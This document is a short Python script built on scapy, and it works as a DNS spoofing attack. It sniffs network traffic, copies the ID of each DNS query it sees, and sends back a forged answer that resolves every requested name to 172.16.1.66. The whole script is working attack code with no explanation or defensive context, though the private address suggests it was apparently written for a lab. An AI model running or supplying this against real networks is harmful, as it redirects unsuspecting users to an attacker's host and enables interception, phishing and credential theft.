#!/usr/bin/python
from scapy.all import *

def dnsMonitorCallBack(pkt):
    if pkt.haslayer(DNS) and pkt.haslayer(UDP):
        packet = NewPacket(pkt)
        send(packet)

def NewPacket(pkt):
    packet = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
             DNS(id=pkt[DNS].id,qr=1,rd=1,ra=1, qd=DNSQR(qname=pkt[DNS][DNSQR].qname,qtype=pkt[DNS][DNSQR].qtype,qclass=pkt[DNS][DNSQR].qclass), an=DNSRR(rrname=pkt[DNS][DNSQR].qname, type="A", rclass="IN", ttl=267, rdata="172.16.1.66"))
    return packet

sniff(prn=dnsMonitorCallBack)